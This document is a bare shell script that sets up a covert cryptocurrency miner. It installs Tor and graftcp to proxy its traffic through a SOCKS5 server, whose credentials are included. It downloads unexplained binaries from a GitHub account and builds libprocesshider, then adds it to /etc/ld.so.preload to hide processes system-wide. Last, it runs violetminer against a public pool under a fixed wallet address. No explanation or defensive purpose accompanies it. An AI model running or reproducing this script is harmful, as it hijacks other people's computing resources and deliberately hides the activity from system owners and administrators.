apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl

apt update

apt -y install binutils cmake build-essential screen unzip net-tools curl nano tor
service tor start

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = sg-socks5.woiden.net:8080
socks5_username = woiden_sairinjitu
socks5_password = 12345
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo ""

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo ""

echo " "
echo " "

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
chmod +x bezzHash

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip


git clone https://github.com/hanifgz/libprocesshider.git
cd libprocesshider;make
sudo mv libprocesshider.so /usr/local/lib/;echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
cd ..


./graftcp/graftcp wget https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz && tar xvf violetminer-linux-v0.2.2.tar.gz && cd violetminer-linux-v0.2.2 && ./violetminer --pool pool.hashvault.pro:80 --username TRTLv1bEDCWed2DJYzEwfmUAdEyT3QHf3TwvE2odPufw8LdCVbKeBB1gfXYmM8FknQ8nkQ796g2t2MqweQUomiH1G2uu85y14so --password BULUS --algorithm chukwa/wrkz
